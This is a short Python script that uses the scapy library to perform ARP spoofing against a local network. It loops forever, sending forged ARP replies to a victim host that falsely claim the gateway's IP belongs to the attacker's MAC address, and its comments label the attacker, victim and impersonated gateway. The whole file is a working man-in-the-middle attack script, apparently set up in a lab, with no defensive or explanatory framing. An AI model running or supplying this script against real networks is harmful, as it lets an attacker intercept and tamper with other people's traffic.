from scapy.all import *
from scapy.layers.inet import Ether
import time

gateway_mac='52:54:00:88:15:b6'
victim_mac='08:00:27:ff:8f:3c'
my_mac='08:00:27:24:32:1f'
broadcast_mac='ff:ff:ff:ff:ff:ff'

while 1:
	sendp(Ether(dst=victim_mac,src=my_mac)/ARP(op=2,psrc="192.168.20.1",pdst="192.168.20.122", hwdst=victim_mac))
	time.sleep(1)

# Ether.dst = mac of victim
# Ether.src = mac of attacker (real mac)
# ARP.psrc = fake ip of attacker that wants impersonate gateway
# ARP.pdst = ip of the victim
# ARP.hwdst = mac of the victim
